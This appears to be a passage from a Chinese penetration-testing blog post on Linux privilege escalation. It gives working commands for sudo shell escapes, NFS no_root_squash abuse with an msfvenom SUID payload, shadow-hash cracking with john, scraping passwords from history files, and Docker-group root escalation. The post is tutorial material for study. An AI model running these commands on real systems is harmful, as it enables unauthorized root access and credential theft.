+<p>向sudoer文件中添加以下内容（可按需增加）：<br><code>sudo_test   ALL= (root) NOPASSWD: /usr/bin/find, (root) NOPASSWD: /usr/bin/vim,(root) NOPASSWD:/usr/bin/awk,(root) NOPASSWD:/usr/bin/man,(root) NOPASSWD:/usr/bin/less,(root) NOPASSWD:/bin/more,(root) NOPASSWD:/bin/tar,(root) NOPASSWD:/usr/bin/zip</code></p>
+<p>撤销文件的写权限： <code>chmod u-w /etc/sudoers</code></p>
+<h3 id="提权操作"><a href="#提权操作" class="headerlink" title="提权操作"></a>提权操作</h3><p>当前已经获取到低权限用户sudo_test，使用 <code>sudo -l</code> 命令查看本用户允许使用的sudo程序。</p>
+<p><img src="/simg/Linux_Privilege_Escalation_2.png" alt=" "></p>
+<ol>
+<li><p>find</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo find /etc/passwd -<span class="built_in">exec</span> /bin/sh \ 	<span class="comment"># 返回root shell</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>vim</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim -c <span class="string">&#x27;!sh&#x27;</span> 	<span class="comment"># 返回root shell</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>awk</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo awk <span class="string">&#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span> 	<span class="comment"># 返回root shell</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>less</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo less /etc/hosts</span><br><span class="line">!</span><br><span class="line">(Enter) 	<span class="comment"># 返回root shell</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>man</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo man man</span><br><span class="line">!</span><br><span class="line">(enter) 	<span class="comment"># 返回root shell</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="外壳逃生序列"><a href="#外壳逃生序列" class="headerlink" title="外壳逃生序列"></a>外壳逃生序列</h2><p>即使没有”明显”的方法来升级特权，我们也可以使用外壳逃生序列。</p>
+<p>即使我们仅限于通过sudo运行某些程序，有时也有可能”逃避”程序并生成壳。<br>由于初始程序具有root权限运行，因此生成的外壳也是如此。<br>此处可以找到带有外壳逃生序列的程序列表：<a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io</a></p>
+<h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><ol>
+<li>列出允许用户运行的程序<br><code>sudo -l</code></li>
+</ol>
+<p><img src="/simg/Linux_Privilege_Escalation.png" alt=" "></p>
+<ol start="2">
+<li><p>对每个程序进行查表，要细心<br><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">GTFObins</a></p>
+</li>
+<li><p>如果存在逃生序列，则通过sudo 运行程序并执行序列以生成根壳。</p>
+</li>
+</ol>
+<h1 id="NFS提权"><a href="#NFS提权" class="headerlink" title="NFS提权"></a>NFS提权</h1><h2 id="简介-3"><a href="#简介-3" class="headerlink" title="简介"></a>简介</h2><p>NFS（网络文件系统）是一种分布式文件系统协议，NFS允许系统通过网络与其他人共享目录和文件。<br>在NFS文件共享中，用户甚至程序可以访问远程系统上的信息，就像它们驻留在本地计算机上一样。<br>NFS中的Root Squashing（root_sqaush）参数阻止对连接到NFS卷的远程root用户具有root访问权限。当该参数设置为no_root_squash时，登入 NFS 主机使用分享目录的使用者如果是 root 的话，那么对于这个分享的目录来说，他就具有 root 的权限，基于此原理便可实现提权。</p>
+<p>NFS共享在&#x2F;etc&#x2F;exports文件中配置。<br>远程用户可以安装共享、访问、创建、修改文件。<br>默认情况下，创建的文件会继承remote用户的ID和组ID(分别作为所有者和组)，即使它们不存在 NFS 服务器上。</p>
+<h2 id="相关命令-1"><a href="#相关命令-1" class="headerlink" title="相关命令"></a>相关命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">showmount -e &lt;target&gt; 	<span class="comment"># 显示NFS服务器的导出列表</span></span><br><span class="line">nmap -sV -script=nfs-showmount &lt;target&gt; 	<span class="comment"># 类似的nmap脚本</span></span><br><span class="line">mount -o rw,vers=2 &lt;target&gt;:&lt;share&gt; &lt;local_directory&gt; 	<span class="comment"># 安装NFS共享</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Root Squashing</strong><br>Root Squashing是 NFS如何防止明显的特权升级。<br>如果远程用户是(或声称是)root(uid&#x3D;0)，NFS将改为”squash”用户，就好像他们是”nobody”用户一样，在”nogroup”组中。<br>虽然此行为是默认的，但它可以禁用！</p>
+<p><strong>no_root_squash</strong><br>no_root_squash是一个 NFS 配置选项，它关闭root的squash。<br>当包含在可写入的共享配置中时，识别为”root”的远程用户可以作为本地根用户在 NFS 共享上创建文件。</p>
+<h2 id="实操-1"><a href="#实操-1" class="headerlink" title="实操"></a>实操</h2><ol>
+<li><p>检查 &#x2F;etc&#x2F;exports 的内容，了解具有no_root_squash选项的配置：<br><code>cat /etc/exports</code></p>
+</li>
+<li><p>确认NFS共享可用于远程安装：<br><code>showmount -e 192.168.1.25</code></p>
+</li>
+<li><p>在kali上创建一个文件夹，并安装&#x2F;tmp NFS共享：<br><code>mkdir /tmp/nfs mount -o rw,vers=2 192.168.175.228:/tmp /tmp/nfs</code></p>
+</li>
+<li><p>使用kali上的root用户生成有效载荷并将其保存到安装的共享中：<br><code>msfvenom -p linux/x86/exec CMD=&quot;/bin/bash -p&quot; -f elf -o /tmp/nfs/shell.elf</code></p>
+</li>
+<li><p>确保文件具有SUID集，并且每个用户都可执行：<br><code>chmod +xs /tmp/nfs/shell.elf</code></p>
+</li>
+<li><p>在目标机器上。执行文件以获取root：<br><code>/tmp/shell.elf bash-4.1</code></p>
+</li>
+</ol>
+<h1 id="password-amp-key-提权"><a href="#password-amp-key-提权" class="headerlink" title="password &amp; key 提权"></a>password &amp; key 提权</h1><h2 id="简介-4"><a href="#简介-4" class="headerlink" title="简介"></a>简介</h2><ol>
+<li>密码<br>虽然这看起来可能很漫长，但弱密码存储和密码重复使用可能是升级权限的简单方法。<br>虽然root用户的帐户密码被隐藏起来，并安全地存储在&#x2F;etc&#x2F;shadow中<br>但其他密码（如用于服务的密码）可能会 以普通文本存储在配置文件中。<br>如果根用户将密码重新用于服务，则可能会找到该密码并用于切换到根用户。</li>
+</ol>
+<p>大多数linux系统的密码都和&#x2F;etc&#x2F;passwd和&#x2F;etc&#x2F;shadow这两个配置文件息息相关。passwd里面储存了用户，shadow里面是密码的hash。出于安全考虑passwd是全用户可读，root可写的。shadow是仅root可读写的。<br>当我们的passwd和shadow一些权限配置不当就可能会导致提权</p>
+<p><strong>passwd文件</strong><br><code>test:x:1000:1000::/home/test:/bin/bash</code><br>passwd 由冒号分割，第一列是用户名，第二列是密码，x 代表密码 hash 被放在 shadow 里面了（非root用户不可读）。<br>当我们的passwd文件给普通用户配置了写权限，那么我们就可以通过修改x为一段已知的密码的hash值来进行提权。</p>
+<p><strong>shadow文件</strong><br><code>test:$6$Mqh9T8ip$4Ev.HJTBdyobrYaW/KzBlL0yx6wefeB.VDcE7KiDiwoUvGkqShU9jRK4cEZA2kBRsyH2fWjmbxc/ZyVWfXwFJ/:18849:0:99999:7:::</code><br>假如我们对shadow文件有读取权限我们就可以利用hash、john等对其进行爆破<br>这里以john为例进行演示，首先把passwd和shadow两文件放在同一文件下</p>
+<p>然后进行破解<br><code>john --user=test test.hash</code></p>
+<ol start="2">
+<li>历史文件<br>历史文件记录用户在使用某些程序时发出的命令。<br>如果用户将密码键入命令的一部分，此密码可能会存储在历史记录文件中。<br>尝试使用发现ed 密码切换到根</li>
+</ol>
+<h2 id="实操-2"><a href="#实操-2" class="headerlink" title="实操"></a>实操</h2><ol>
+<li>查看用户&#x2F;home目录中隐藏文件的内容，文件名以“历史记录”结尾：<br><code>cat ~/.*history | less</code></li>
+</ol>
+<p>两次q退出来<br>似乎连接到MySQL服务器的用户<br><code>rootpassword123</code></p>
+<ol start="2">
+<li>su登录<br><img src="/simg/Linux_Privilege_Escalation_3.png" alt=" "></li>
+</ol>
+<h1 id="Docker提权"><a href="#Docker提权" class="headerlink" title="Docker提权"></a>Docker提权</h1><p>除了利用Linux系统自带的工具进行提权，还可以利用大量存在风险的第三方工具进行提权，本文以Docker为例进行演示。 随着云化时代的来临，docker也越来越流行，在很多公司内部的linux机器上docker已然成了标配。Docker使用便捷，有以下几个特性：</p>
+<p>（1）可免sudo使用docker：默认情况下使用docker必须要有sudo权限，对于一台机器多用户使用，往往很多用户只有普通权限。为了让普通用户也可以使用Docker，管理员将需要使用docker的用户添加到docker用户组(安装docker后默认会创建该组)中，用户重新登录机器即可免sudo使用docker了。</p>
+<p>（2）容器内用户权限不受限：用户创建一个docker容器后，容器内默认是root账户，在不需要加sudo的情况下可以任意更改容器内的配置。正常情况下，这种模式既可以保证一台机器被很多普通用户使用，通过docker容器的隔离，相互之前互不影响；也给用户在容器内开放了充足的权限保证用户可以正常安装软件，修改容器配置等操作。</p>
+<p>（3）容器内外文件可映射：docker提供了一个-v选项，提供用户将容器外的host目录映射进容器内，方便的进行容器内外的文件共享。</p>
+<p>结合上面三个特点，可以实现用户提权操作。</p>
+<ol>
+<li><p>用户配置<br>使用管理员新建一个普通用户user_docker，并将其添加到docker组中：<br><code>sudo gpasswd -a user_docker docker</code></p>
+</li>
+<li><p>提权操作<br>通过前期的渗透操作，拿下user_docker的权限，下面对其进行提权。<br>首先，运行一个容器：<br><code>docker run -it -v /etc:/etc ubuntu /bin/bash</code><br>将宿主机的&#x2F;etc目录直接映射进容器，从而覆盖了容器内的&#x2F;etc目录。<br>由于linux系统上的本地用户信息主要记录在&#x2F;etc&#x2F;目录下，比如两个常见文件&#x2F;etc&#x2F;passwd和&#x2F;etc&#x2F;group，而在容器内当前用户有root权限，于是可以随意修改这两个文件，实现提权：</p>
+</li>
+</ol>
+<p>修改&#x2F;etc&#x2F;passwd文件，可更改root密码，或者新增一个uid&#x3D;0的用户。</p>
+<p>修改&#x2F;etc&#x2F;group文件，将当前用户添加到sudo组中。</p>
+<p>本文演示第二种方法，在容器内执行下列命令：<br><code>usermod -aG sudo user_docker</code><br>将user_docker用户加载到sudo组中，而后退出容器。</p>
+<p>查看宿主机文件&#x2F;etc&#x2F;group，可见user_docker已经拥有sudo权限，提权成功！</p>
+<p>除此之外，DockerHub上已经有人将exp打包成镜像rootplease 。<br>只要用户在 docker 组中，运行下面命令就能直接在 docker 中获取到 root 权限:<br><code>docker run -v /:/hostOS -it chrisfosterelli/rootplease</code><br>容器生成后自动获取到宿主机的 root 权限，并启动 shell 程序，直接在 docker 中执行命令。</p>
+<p>在这种多用户借助docker共用一台机器的情况下，普通用户可以借助docker提升为sudo用户，从而可以进行任意修改系统配置等各种恶意操作。<br>以上是本地用户的破坏还不是很明显，毕竟是公司内部用户大多不会进行恶意操作。然而，很多情况下普通用户为了方便，用户密码往往设置得很简单，如果攻击者通过其他途径暴力破解普通用户弱口令，就可以很轻松得提示为管理员从事不可限制的恶意操作，这也大大降低了攻击者的攻击难度。</p>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a target="_blank" rel="noopener" href="https://blog.nsfocus.net/linux/">LINUX提权手法实践</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sfsec/p/15163907.html">Linux提权总结</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/362070.html">Linux提权姿势总结</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/280398.html">手把手教你Linux提权</a></p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>我很可爱，请给我钱</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Bron
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2023/08/28/Linux%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8F%90%E6%9D%83/" title="Linux内网渗透之提权">http://example.com/2023/08/28/Linux内网渗透之提权/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/Elaina_Anime">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+        </div>
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/SelfEnglishWords">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+        </div>
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag"><i class="fa fa-tag"></i> 内网渗透</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/08/28/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E5%8F%8D%E5%BC%B9shell/" rel="prev" title="内网渗透之反弹shell">
+      <i class="fa fa-chevron-left"></i> 内网渗透之反弹shell
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">2.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="nav-number">3.</span> <span class="nav-text">内核漏洞提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E4%BE%8B%E6%BC%94%E7%A4%BA"><span class="nav-number">3.1.</span> <span class="nav-text">实例演示</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%8F%90%E6%9D%83"><span class="nav-number">4.</span> <span class="nav-text">定时任务提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80-1"><span class="nav-number">4.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E6%93%8D"><span class="nav-number">4.2.</span> <span class="nav-text">实操</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SUID%E6%8F%90%E6%9D%83"><span class="nav-number">5.</span> <span class="nav-text">SUID提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B-1"><span class="nav-number">5.1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SUID%E6%9D%83%E9%99%90"><span class="nav-number">5.2.</span> <span class="nav-text">SUID权限</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Sudo%E6%BB%A5%E7%94%A8%E6%8F%90%E6%9D%83"><span class="nav-number">6.</span> <span class="nav-text">Sudo滥用提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B-2"><span class="nav-number">6.1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4"><span class="nav-number">6.2.</span> <span class="nav-text">相关命令</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE"><span class="nav-number">6.2.1.</span> <span class="nav-text">权限配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83%E6%93%8D%E4%BD%9C"><span class="nav-number">6.2.2.</span> <span class="nav-text">提权操作</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%96%E5%A3%B3%E9%80%83%E7%94%9F%E5%BA%8F%E5%88%97"><span class="nav-number">6.3.</span> <span class="nav-text">外壳逃生序列</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A4"><span class="nav-number">6.3.1.</span> <span class="nav-text">步骤</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#NFS%E6%8F%90%E6%9D%83"><span class="nav-number">7.</span> <span class="nav-text">NFS提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B-3"><span class="nav-number">7.1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4-1"><span class="nav-number">7.2.</span> <span class="nav-text">相关命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E6%93%8D-1"><span class="nav-number">7.3.</span> <span class="nav-text">实操</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#password-amp-key-%E6%8F%90%E6%9D%83"><span class="nav-number">8.</span> <span class="nav-text">password &amp; key 提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B-4"><span class="nav-number">8.1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E6%93%8D-2"><span class="nav-number">8.2.</span> <span class="nav-text">实操</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Docker%E6%8F%90%E6%9D%83"><span class="nav-number">9.</span> <span class="nav-text">Docker提权</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%87%B4%E8%B0%A2"><span class="nav-number">10.</span> <span class="nav-text">致谢</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Bron"
+      src="/images/Elaina.png">
+  <p class="site-author-name" itemprop="name">Bron</p>
+  <div class="site-description" itemprop="description">原谅我这一生不羁放纵爱自由</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">169</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">62</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">55</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/truthnian" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;truthnian" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/Elaina_Anime" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;Elaina_Anime" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://youtube.com/2CTruth" title="YouTube → https:&#x2F;&#x2F;youtube.com&#x2F;2CTruth" rel="noopener" target="_blank"><i class="fab fa-youtube fa-fw"></i>YouTube</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://truthnian.github.io/" title="https:&#x2F;&#x2F;truthnian.github.io" rel="noopener" target="_blank">世界上最好的网站</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; Thu Nov 03 2022 08:00:00 GMT+0800 (Singapore Standard Time) – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Bron</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">417k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">6:19</span>
+</div>
+
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+-->
+
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("11/3/2022 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已存活 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+    <script defer src="/lib/three/canvas_lines.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+<script src="https://unpkg.com/darkmode-js@1.5.7/lib/darkmode-js.min.js"></script>
+
+<script>
+var options = {
+  bottom: '64px',
+  right: 'unset',
+  left: '32px',
+  time: '0.3s',
+  mixColor: 'transparent',
+  backgroundColor: 'transparent',
+  buttonColorDark: '#FFFFE0',
+  buttonColorLight: '#00BFFF',
+  saveInCookies: true,
+  label: '🌓',
+  autoMatchOsTheme: true
+}
+const darkmode = new Darkmode(options);
+window.darkmode = darkmode;
+darkmode.showWidget();
+</script>
+<div class="moon-menu">
+  <div class="moon-menu-items">
+    
+    <div id="moon-menu-item-back2bottom" class="moon-menu-item">
+      <i class='fas fa-chevron-down'></i>    </div>
+    
+    <div id="moon-menu-item-back2top" class="moon-menu-item">
+      <i class='fas fa-chevron-up'></i>    </div>
+    
+  </div>
+  <div class="moon-menu-button">
+    <svg class="moon-menu-bg">
+      <circle class="moon-menu-cricle" cx="50%" cy="50%" r="44%"></circle>
+      <circle class="moon-menu-border" cx="50%" cy="50%" r="48%"></circle>
+    </svg>
+    <div class="moon-menu-content">
+      <div class="moon-menu-icon"><i class='fas fa-ellipsis-v'></i></div>
+      <div class="moon-menu-text"></div>
+    </div>
+  </div>
+</div><script src="/js/injector.js"></script>
+    </div>
+</body>
+</html>
+
+
